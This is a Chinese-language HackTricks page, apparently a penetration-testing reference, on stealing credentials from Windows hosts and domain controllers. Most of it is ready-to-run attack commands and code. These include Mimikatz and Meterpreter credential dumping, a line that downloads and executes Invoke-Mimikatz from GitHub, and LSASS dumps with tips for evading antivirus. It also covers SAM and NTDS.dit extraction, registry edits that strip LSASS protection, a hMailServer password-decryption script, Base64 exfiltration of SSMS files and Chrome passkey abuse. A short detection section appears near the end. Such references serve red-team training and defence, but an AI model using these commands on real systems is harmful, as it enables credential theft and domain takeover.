# 窃取 Windows 凭据

{{#include ../../banners/hacktricks-training.md}}

## 凭据 Mimikatz
```bash
#Elevate Privileges to extract the credentials
privilege::debug #This should give am error if you are Admin, butif it does, check if the SeDebugPrivilege was removed from Admins
token::elevate
#Extract from lsass (memory)
sekurlsa::logonpasswords
#Extract from lsass (service)
lsadump::lsa /inject
#Extract from SAM
lsadump::sam
#One liner
mimikatz "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"
```
**查找 Mimikatz 能够执行的其他操作，参见** [**此页面**](credentials-mimikatz.md)**。**

### Invoke-Mimikatz
```bash
IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
Invoke-Mimikatz -DumpCreds #Dump creds from memory
Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
```
[**在此了解一些可能的凭据保护措施。**](credentials-protections.md) **这些保护措施可能会阻止 Mimikatz 提取某些凭据。**

## 使用 Meterpreter 的凭据

使用我创建的 [**凭据插件**](https://github.com/carlospolop/MSF-Credentials)，在受害者系统中**搜索密码和哈希**。
```bash
#Credentials from SAM
post/windows/gather/smart_hashdump
hashdump

#Using kiwi module
load kiwi
creds_all
kiwi_cmd "privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam"

#Using Mimikatz module
load mimikatz
mimikatz_command -f "sekurlsa::logonpasswords"
mimikatz_command -f "lsadump::lsa /inject"
mimikatz_command -f "lsadump::sam"
```
## 绕过 AV

### Procdump + Mimikatz

由于 **Procdump from** [**SysInternals** ](https://docs.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite)** 是合法的 Microsoft 工具**，因此不会被 Defender 检测到。\
你可以使用此工具 **转储 lsass 进程**、**下载转储文件**，并从转储文件中在本地**提取** **凭据**。

你也可以使用 [SharpDump](https://github.com/GhostPack/SharpDump)。
```bash:Dump lsass
#Local
C:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
#Remote, mount https://live.sysinternals.com which contains procdump.exe
net use Z: https://live.sysinternals.com
Z:\procdump.exe -accepteula -ma lsass.exe lsass.dmp
# Get it from webdav
\\live.sysinternals.com\tools\procdump.exe -accepteula -ma lsass.exe lsass.dmp
```

```c:Extract credentials from the dump
//Load the dump
mimikatz # sekurlsa::minidump lsass.dmp
//Extract credentials
mimikatz # sekurlsa::logonPasswords
```
此过程可通过 [SprayKatz](https://github.com/aas-n/spraykatz) 自动完成：`./spraykatz.py -u H4x0r -p L0c4L4dm1n -t 192.168.1.0/24`

**注意**：某些 **AV** 可能会将使用 **procdump.exe 转储 lsass.exe** 检测为**恶意行为**，这是因为它们会**检测**字符串 **"procdump.exe" 和 "lsass.exe"**。因此，更隐蔽的做法是将 lsass.exe 的 **PID** 作为参数传递给 procdump，而不是传递 **lsass.exe 的名称**。

### 使用 **comsvcs.dll** 转储 lsass

位于 `C:\Windows\System32` 中的名为 **comsvcs.dll** 的 DLL 负责在进程崩溃时**转储进程内存**。该 DLL 包含一个名为 **`MiniDumpW`** 的**函数**，设计为通过 `rundll32.exe` 调用。\
前两个参数无关紧要，但第三个参数分为三个部分。要转储的进程 ID 构成第一部分，转储文件位置表示第二部分，而第三部分必须严格为 **full**。不存在其他可选项。\
解析这三个部分后，该 DLL 会创建转储文件，并将指定进程的内存传输到该文件中。\
可以利用 **comsvcs.dll** 转储 lsass 进程，从而无需上传和执行 procdump。该方法在 [https://en.hackndo.com/remote-lsass-dump-passwords/](https://en.hackndo.com/remote-lsass-dump-passwords) 中有详细说明。<sup>[[9]](#references)</sup>

以下命令用于执行：
```bash
rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <lsass pid> lsass.dmp full
```
**你可以使用** [**lssasy**](https://github.com/Hackndo/lsassy)** 自动化此过程。**

### **使用 Task Manager Dump lsass**

1. 右键单击任务栏，然后单击 Task Manager
2. 单击“更多详细信息”
3. 在“进程”选项卡中查找名为 "Local Security Authority Process" 的进程
4. 右键单击 "Local Security Authority Process" 进程，然后单击 "Create dump file"。

### 使用 procdump Dump lsass

[Procdump](https://docs.microsoft.com/en-us/sysinternals/downloads/procdump) 是一个由 Microsoft 签名的二进制文件，属于 [sysinternals](https://docs.microsoft.com/en-us/sysinternals/) 套件。
```
Get-Process -Name LSASS
.\procdump.exe -ma 608 lsass.dmp
```
## 使用 PPLBlade 转储 lsass

[**PPLBlade**](https://github.com/tastypepperoni/PPLBlade) 是一个 Protected Process Dumper Tool，支持对内存转储进行混淆，并将其传输到远程工作站，而无需将其写入磁盘。

**主要功能**：

1. 绕过 PPL 保护
2. 对内存转储文件进行混淆，以规避 Defender 基于签名的检测机制
3. 使用 RAW 和 SMB upload 方法上传内存转储，而无需将其写入磁盘（fileless dump）
```bash
PPLBlade.exe --mode dump --name lsass.exe --handle procexp --obfuscate --dumpmode network --network raw --ip 192.168.1.17 --port 1234
```
## LalsDumper – 基于 SSP 的 LSASS dumping，无需调用 MiniDumpWriteDump

Ink Dragon 提供了一个名为 **LalsDumper** 的三阶段 dumper，它从不调用 `MiniDumpWriteDump`，因此针对该 API 的 EDR hooks 永远不会触发：<sup>[[3]](#references)</sup>

1. **Stage 1 loader (`lals.exe`)** – 在 `fdp.dll` 中搜索由 32 个小写 `d` 字符组成的占位符，将其覆盖为 `rtu.txt` 的绝对路径，把修补后的 DLL 保存为 `nfdp.dll`，然后调用 `AddSecurityPackageA("nfdp","fdp")`。这会强制 **LSASS** 将恶意 DLL 作为新的 Security Support Provider (SSP) 加载。
2. **LSASS 内部的 Stage 2** – 当 LSASS 加载 `nfdp.dll` 时，该 DLL 读取 `rtu.txt`，将每个字节与 `0x20` 进行 XOR，然后把解码后的 blob 映射到内存中并转移执行权限。
3. **Stage 3 dumper** – 映射到内存中的 payload 使用从 hashed API names 解析出的 **direct syscalls**（`seed = 0xCD7815D6; h ^= (ch + ror32(h,8))`）重新实现 MiniDump 逻辑。名为 `Tom` 的专用 export 会打开 `%TEMP%\<pid>.ddt`，将压缩后的 LSASS dump 流式写入文件，然后关闭句柄，以便之后进行 exfiltration。

操作说明：

* 将 `lals.exe`、`fdp.dll`、`nfdp.dll` 和 `rtu.txt` 保存在同一目录中。Stage 1 会将硬编码的占位符改写为 `rtu.txt` 的绝对路径，因此拆分这些文件会破坏整个链条。
* 注册过程是将 `nfdp` 追加到 `HKLM\SYSTEM\CurrentControlSet\Control\Lsa\Security Packages`。你可以自行预先设置该值，使 LSASS 在每次启动时重新加载该 SSP。
* `%TEMP%\*.ddt` 文件是压缩后的 dumps。先在本地解压，然后将其交给 Mimikatz/Volatility 进行凭据提取。
* 运行 `lals.exe` 需要 admin/SeTcb 权限，以便 `AddSecurityPackageA` 成功；调用返回后，LSASS 会透明地加载 rogue SSP 并执行 Stage 2。
* 从磁盘删除 DLL 并不会将其从 LSASS 中驱逐。你需要删除注册表项并重启 LSASS（重启系统），或者保留它以实现长期持久化。

## CrackMapExec

### Dump SAM hashes
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --sam
```
### Dump LSA secrets
```
cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --lsa
```
### 从目标 DC 导出 NTDS.dit
```
cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds
#~ cme smb 192.168.1.100 -u UserNAme -p 'PASSWORDHERE' --ntds vss
```
### 从目标 DC 转储 NTDS.dit 密码历史记录
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-history
```
### 显示每个 NTDS.dit 账户的 pwdLastSet 属性
```
#~ cme smb 192.168.1.0/24 -u UserNAme -p 'PASSWORDHERE' --ntds-pwdLastSet
```
## 窃取 SAM 和 SYSTEM

这些文件应**位于** _C:\windows\system32\config\SAM_ 和 _C:\windows\system32\config\SYSTEM_。但**不能直接以常规方式复制它们**，因为它们受到保护。

### 从 Registry 获取

窃取这些文件最简单的方法是从 Registry 获取副本：
```
reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security
```
**下载**这些文件到你的 Kali 机器，并使用以下命令**提取哈希值**：
```
samdump2 SYSTEM SAM
impacket-secretsdump -sam sam -security security -system system LOCAL
```
### Volume Shadow Copy

你可以使用此服务复制受保护的文件。你需要具备 Administrator 权限。

#### 使用 vssadmin

vssadmin 二进制文件仅在 Windows Server 版本中可用
```bash
vssadmin create shadow /for=C:
#Copy SAM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SAM C:\Extracted\SAM
#Copy SYSTEM
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\system32\config\SYSTEM C:\Extracted\SYSTEM
#Copy ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy8\windows\ntds\ntds.dit C:\Extracted\ntds.dit

# You can also create a symlink to the shadow copy and access it
mklink /d c:\shadowcopy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\
```
但你也可以从 **Powershell** 执行相同操作。以下示例展示了**如何复制 SAM 文件**（使用的硬盘是“C:”，文件保存到 C:\users\Public），但你也可以使用此方法复制任何受保护的文件：
```bash
$service=(Get-Service -name VSS)
if($service.Status -ne "Running"){$notrunning=1;$service.Start()}
$id=(gwmi -list win32_shadowcopy).Create("C:\","ClientAccessible").ShadowID
$volume=(gwmi win32_shadowcopy -filter "ID='$id'")
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\sam" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\system32\config\system" C:\Users\Public
cmd /c copy "$($volume.DeviceObject)\windows\ntds\ntds.dit" C:\Users\Public
$volume.Delete();if($notrunning -eq 1){$service.Stop()}
```
本书中的代码：[https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)<sup>[[7]](#references)</sup>

### Invoke-NinjaCopy

最后，你还可以使用 [**PS script Invoke-NinjaCopy**](https://github.com/PowerShellMafia/PowerSploit/blob/master/Exfiltration/Invoke-NinjaCopy.ps1) 来复制 SAM、SYSTEM 和 ntds.dit。
```bash
Invoke-NinjaCopy.ps1 -Path "C:\Windows\System32\config\sam" -LocalDestination "c:\copy_of_local_sam"
```
## **Active Directory 凭据 - NTDS.dit**

**NTDS.dit** 文件被称为 **Active Directory** 的核心，其中存储了有关用户对象、组及其成员关系的关键数据。域用户的 **密码哈希** 就存储在此文件中。该文件是一个 **可扩展存储引擎（ESE）** 数据库，位于 **_%SystemRoom%/NTDS/ntds.dit_**。

该数据库中维护着三个主要表：

- **Data Table**：负责存储用户和组等对象的详细信息。
- **Link Table**：用于记录组成员关系等关联关系。
- **SD Table**：保存每个对象的 **安全描述符**，从而确保所存储对象的安全性和访问控制。

Christoffer Andersson 关于数据库层的研究文档更详细地介绍了这些表及其特定版本的行为。<sup>[[8]](#references)</sup>

Windows 使用 _Ntdsa.dll_ 与该文件交互，该文件由 _lsass.exe_ 使用。随后，**NTDS.dit** 文件的**部分内容**可能位于 **`lsass`** 内存中（由于使用 **缓存** 可以提升性能，因此你可能会找到最近访问的数据）。

#### 解密 NTDS.dit 内的哈希

该哈希会被加密三次：

1. 使用 **BOOTKEY** 和 **RC4** 解密密码加密密钥（**PEK**）。
2. 使用 **PEK** 和 **RC4** 解密该**哈希**。
3. 使用 **DES** 解密该**哈希**。

每个域控制器上的 **PEK** **值都相同**，但它会使用该域控制器特有的 **BOOTKEY** 进行加密，并存储在 **NTDS.dit** 中；该 **BOOTKEY** 来自该域控制器的 **SYSTEM** hive。因此，提取凭据需要同时获取 **NTDS.dit** 和 **SYSTEM**（`C:\Windows\System32\config\SYSTEM`）。

### 使用 Ntdsutil 复制 NTDS.dit

Windows Server 2008 起可用。
```bash
ntdsutil "ac i ntds" "ifm" "create full c:\copy-ntds" quit quit
```
你也可以使用 [**volume shadow copy**](#stealing-sam-and-system) 技巧来复制 **ntds.dit** 文件。请记住，你还需要一份 **SYSTEM 文件**（同样可以[**从注册表中 dump 或使用 volume shadow copy**](#stealing-sam-and-system) 技巧获取）。

### **从 NTDS.dit 提取哈希**

获得 **NTDS.dit** 和 **SYSTEM** 文件后，你可以使用 _secretsdump.py_ 等工具来**提取哈希**：
```bash
secretsdump.py LOCAL -ntds ntds.dit -system SYSTEM -outputfile credentials.txt
```
你还可以使用有效的域管理员用户**自动提取它们**：
```
secretsdump.py -just-dc-ntlm <DOMAIN>/<USER>@<DOMAIN_CONTROLLER>
```
对于**较大的 NTDS.dit 文件**，建议使用 [gosecretsdump](https://github.com/c-sto/gosecretsdump) 进行提取。

最后，你还可以使用 **metasploit module**：_post/windows/gather/credentials/domain_hashdump_，或使用 **mimikatz** `lsadump::lsa /inject`

### **将域对象从 NTDS.dit 提取到 SQLite 数据库**

使用 [ntdsdotsqlite](https://github.com/almandin/ntdsdotsqlite) 可以将 NTDS 对象提取到 SQLite 数据库中。不仅会提取 secrets，还会提取完整的对象及其属性，以便在已经获取原始 NTDS.dit 文件后进一步提取信息。
```
ntdsdotsqlite ntds.dit -o ntds.sqlite --system SYSTEM.hive
```
`SYSTEM` hive 是可选的，但可用于解密 secrets（NT 和 LM hashes、supplemental credentials，例如 cleartext passwords、kerberos 或 trust keys、NT 和 LM password histories）。此外，还会提取以下数据：用户和机器账户及其 hashes、UAC flags、上次登录和密码更改的时间戳、账户描述、名称、UPN、SPN、groups 及其递归 memberships、organizational units 树及其 membership、受信任域及其 trusts 类型、方向和属性……

## Lazagne

从[这里](https://github.com/AlessandroZ/LaZagne/releases)下载 binary。你可以使用此 binary 从多种 software 中提取 credentials。
```
lazagne.exe all
```
## 从 SAM 和 LSASS 提取凭据的其他工具

### Windows credentials Editor (WCE)

此工具可用于从内存中提取凭据。下载地址：[http://www.ampliasecurity.com/research/windows-credentials-editor/](https://www.ampliasecurity.com/research/windows-credentials-editor/)

### fgdump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate fgdump.exe
fgdump.exe
```
### PwDump

从 SAM 文件中提取凭据
```
You can find this binary inside Kali, just do: locate pwdump.exe
PwDump.exe -o outpwdump -x 127.0.0.1
type outpwdump
```
### PwDump7

从以下地址下载：[ http://www.tarasco.org/security/pwdump_7](http://www.tarasco.org/security/pwdump_7)，然后直接**执行它**，即可提取密码。

## Mining idle RDP sessions and weakening security controls

Ink Dragon 的 FinalDraft RAT 包含一个 `DumpRDPHistory` tasker，其中的技术对任何 red-teamer 都很有用：<sup>[[3]](#references)</sup>

### DumpRDPHistory-style telemetry collection

* **Outbound RDP targets** – 解析每个用户 hive 中的 `HKU\<SID>\SOFTWARE\Microsoft\Terminal Server Client\Servers\*`。每个子键都会存储服务器名称、`UsernameHint` 以及最后写入时间戳。你可以使用 PowerShell 复现 FinalDraft 的逻辑：

```powershell
Get-ChildItem HKU:\ | Where-Object { $_.Name -match "S-1-5-21" } | ForEach-Object {
Get-ChildItem "${_.Name}\SOFTWARE\Microsoft\Terminal Server Client\Servers" -ErrorAction SilentlyContinue |
ForEach-Object {
$server = Split-Path $_.Name -Leaf
$user = (Get-ItemProperty $_.Name).UsernameHint
"OUT:$server:$user:$((Get-Item $_.Name).LastWriteTime)"
}
}
```

* **Inbound RDP evidence** – 查询 `Microsoft-Windows-TerminalServices-LocalSessionManager/Operational` 日志中的事件 ID **21**（成功登录）和 **25**（断开连接），以确定谁管理过该主机：

```powershell
Get-WinEvent -LogName "Microsoft-Windows-TerminalServices-LocalSessionManager/Operational" \
| Where-Object { $_.Id -in 21,25 } \
| Select-Object TimeCreated,@{n='User';e={$_.Properties[1].Value}},@{n='IP';e={$_.Properties[2].Value}}
```

确定经常连接的 Domain Admin 后，在其**断开连接**的会话仍然存在时转储 LSASS（使用 LalsDumper/Mimikatz）。CredSSP + NTLM fallback 会将其 verifier 和 tokens 留在 LSASS 中，之后可以通过 SMB/WinRM 重放它们，以获取 `NTDS.dit` 或在域控制器上部署 persistence。

### Registry downgrades targeted by FinalDraft

同一个 implant 还会篡改多个注册表键，使 credential theft 更加容易：<sup>[[3]](#references)</sup>
```cmd
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DisableRestrictedAdmin /t REG_DWORD /d 1 /f
reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v DSRMAdminLogonBehavior /t REG_DWORD /d 2 /f
reg add HKLM\SYSTEM\CurrentControlSet\Control\Lsa /v RunAsPPL /t REG_DWORD /d 0 /f
```
* 设置 `DisableRestrictedAdmin=1` 会在 RDP 期间强制完整的凭据/票据复用，从而启用类似 pass-the-hash 的横向跳转。
* `LocalAccountTokenFilterPolicy=1` 会禁用 UAC 令牌过滤，使本地管理员通过网络获得不受限制的令牌。
* `DSRMAdminLogonBehavior=2` 允许 DSRM 管理员在 DC 在线时登录，为攻击者提供另一个内置的高权限账户。
* `RunAsPPL=0` 会移除 LSASS PPL 保护，使使用 LalsDumper 等工具进行内存访问变得轻而易举。

## hMailServer 数据库凭据（post-compromise）

hMailServer 会将其数据库密码存储在 `C:\Program Files (x86)\hMailServer\Bin\hMailServer.ini` 的 `[Database] Password=` 下。该值使用静态密钥 `THIS_KEY_IS_NOT_SECRET` 和 4 字节字序交换进行 Blowfish 加密。使用 INI 中的十六进制字符串配合以下 Python 代码片段：<sup>[[2]](#references)</sup>
```python
from Crypto.Cipher import Blowfish
import binascii

def swap4(data):
return b"".join(data[i:i+4][::-1] for i in range(0, len(data), 4))
enc_hex = "HEX_FROM_HMAILSERVER_INI"
enc = binascii.unhexlify(enc_hex)
key = b"THIS_KEY_IS_NOT_SECRET"
plain = swap4(Blowfish.new(key, Blowfish.MODE_ECB).decrypt(swap4(enc))).rstrip(b"\x00")
print(plain.decode())
```
使用明文密码复制 SQL CE 数据库以避免文件锁定，加载 32 位 provider，并在查询哈希前根据需要进行升级：
```powershell
Copy-Item "C:\Program Files (x86)\hMailServer\Database\hMailServer.sdf" C:\Windows\Temp\
Add-Type -Path "C:\Program Files (x86)\Microsoft SQL Server Compact Edition\v4.0\Desktop\System.Data.SqlServerCe.dll"
$engine = New-Object System.Data.SqlServerCe.SqlCeEngine("Data Source=C:\Windows\Temp\hMailServer.sdf;Password=[DBPASS]")
$engine.Upgrade("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf")
$conn = New-Object System.Data.SqlServerCe.SqlCeConnection("Data Source=C:\Windows\Temp\hMailServerUpgraded.sdf;Password=[DBPASS]"); $conn.Open()
$cmd = $conn.CreateCommand(); $cmd.CommandText = "SELECT accountaddress,accountpassword FROM hm_accounts"; $cmd.ExecuteReader()
```
`accountpassword` 列使用 hMailServer hash 格式（hashcat mode `1421`）。破解这些值可以获得可复用的凭据，用于 WinRM/SSH pivots。

## LSA Logon Callback Interception (LsaApLogonUserEx2)

一些工具通过拦截 LSA logon callback `LsaApLogonUserEx2` 来捕获**明文 logon passwords**。其原理是在 authentication package callback 上 hook 或进行封装，从而在 logon **期间**（hashing 之前）捕获凭据，然后将其写入磁盘或返回给 operator。这通常通过注入到 LSA、或向 LSA 注册 helper 来实现，随后记录每次成功的 interactive/network logon event，包括 username、domain 和 password。<sup>[[1]](#references)</sup>

Operational notes:
- 需要 local admin/SYSTEM 权限，才能将 helper 加载到 authentication path 中。
- 只有在发生 logon 时才会出现 captured credentials（具体取决于 hook，可能是 interactive、RDP、service 或 network logon）。

## SSMS Saved Connection Credentials (sqlstudio.bin)

SQL Server Management Studio (SSMS) 会将已保存的连接信息存储在每个用户对应的 `sqlstudio.bin` 文件中。专用 dumper 可以解析该文件并恢复已保存的 SQL credentials。在只能返回 command output 的 shell 中，通常会将该文件编码为 Base64，然后打印到 stdout，从而完成 exfiltration。<sup>[[1]](#references)</sup>
```cmd
certutil -encode sqlstudio.bin sqlstudio.b64
type sqlstudio.b64
```
在 operator 端，重新构建该文件，并在本地运行 dumper 以恢复凭据：
```bash
base64 -d sqlstudio.b64 > sqlstudio.bin
```
## 从 Windows 上的 Chrome 窃取 Passkeys / WebAuthn 凭据

如果在使用 **Chrome + Google Password Manager 同步的 passkeys** 的 Windows 主机上，以**受害者用户**身份获得代码执行权限，那么即使**没有 admin/SYSTEM** 权限，passkeys 也会成为有价值的 post-exploitation 目标。<sup>[[4]](#references)</sup>

### 有价值的本地 artifacts
```text
%LocalAppData%\Google\Chrome\User Data\<Profile>\Sync Data\LevelDB
%LocalAppData%\Google\Chrome\User Data\<Profile>\passkey_enclave_state
```
- **`Sync Data\LevelDB`** 存储 protobuf 编码的 **`WebauthnCredentialSpecifics`** 记录。同一用户的进程可以枚举已同步 passkeys 的 **RP ID**、**username**、**credential ID** 以及加密的私钥材料。<sup>[[5]](#references)</sup>
- **`passkey_enclave_state`** 存储本地设备注册状态，例如 **`wrapped_identity_private_key`**，以及用于恢复已同步凭据的封装 secret。<sup>[[4]](#references)</sup>

快速分诊：
```powershell
Get-ChildItem "$env:LOCALAPPDATA\Google\Chrome\User Data" -Recurse -Force |
Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
Select-Object FullName, Length, LastWriteTime
```
### TPM-bound 密钥 blob 仍可被滥用为本地签名 oracle

如果浏览器将 TPM-backed identity key 导出为 **`NCRYPT_OPAQUE_KEY_BLOB`**，并将该 blob 存储在用户可访问的状态中，malware **不需要提取原始私钥**。它只需在**同一台机器**上重新导入该 blob，然后要求本地 TPM 对攻击者控制的数据进行签名：<sup>[[4]](#references)[[6]](#references)</sup>
```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```
这意味着，**硬件绑定可以防止设备外导出，但无法阻止被入侵终端上的同一用户使用**。

### 实际滥用途径

1. **Pass-ta-key / device-identity relay**<sup>[[4]](#references)</sup>
- 从 Chrome 的 LevelDB 中枚举 `WebauthnCredentialSpecifics`。
- 启动 passkey 登录并获取新的 WebAuthn challenge。
- 使用受害者 TPM 上被窃取的 `wrapped_identity_private_key` blob，对 cloud-authenticator request binding 进行签名。
- 将返回的 assertion relay 给 relying party。
- 当 RP 接受 `userVerification=preferred`，或未能拒绝带有 **`UV=0`** 的 assertion 时，这种方式尤其有价值。
2. **Pending UV-key hijack**<sup>[[4]](#references)</sup>
- 通过删除 `passkey_enclave_state`，或发送有效签名的 `device/forget` operation，强制重新 onboarding。
- 如果 onboarding 后设备处于 **`uv_key_pending`** 状态，则注册由攻击者控制的 UV public key。
- 如果 provider 未验证新 UV key 的 attestation / secure-hardware origin，则之后来自攻击者 key 的签名会被视为 **`UV=1`**。
3. **Master-secret / SDS recovery theft**<sup>[[4]](#references)</sup>
- 强制 recovery 或 rejoin，使 Chrome 获取 synced-passkey master secret。
- 监视 `passkey_enclave_state` 的重新创建或修改，然后在明文 **security domain secret (SDS)** 驻留期间 dump Chrome 内存。
- 使用恢复的 SDS 解密每条 `WebauthnCredentialSpecifics` 记录中的加密字段，并恢复可移植的 WebAuthn private keys。

### DFIR / detection 思路

- 监控 `passkey_enclave_state` 的**删除/重新创建**。<sup>[[4]](#references)</sup>
- 对非浏览器进程异常访问 Chrome **`Sync Data\LevelDB`** 发出告警。
- 对 **Chrome memory dumps** 或可疑的跨进程内存访问发出告警。
- 调查反复出现的 **Google Password Manager recovery PIN** 提示，或意外的重新 onboarding。
- 注意，synced passkeys 的 WebAuthn **`signCount`** 通常没有太大作用，因为它可能保持不变，因此经典的 clone detection 能力较弱。

## References

- [1] [Unit 42 – 针对高价值行业的多年未被发现行动调查](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo：通过 SMTP 进行 Word VBA macro phishing → hMailServer credential decryption → 使用 Veeam CVE-2023-27532 获取 SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – 深入 Ink Dragon：揭示隐蔽 Offensive Operation 的 Relay Network 和内部工作机制](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey：Passwordless Authentication 中的新型 Attack Surface](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG key storage](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Hacking Windows：Microsoft 系统与网络攻击](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [Active Directory Data Store 的实际工作原理：深入了解 NTDS.dit（第 1 部分）](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com - Remote Lsass Dump Passwords](https://en.hackndo.com/remote-lsass-dump-passwords)
{{#include ../../banners/hacktricks-training.md}}
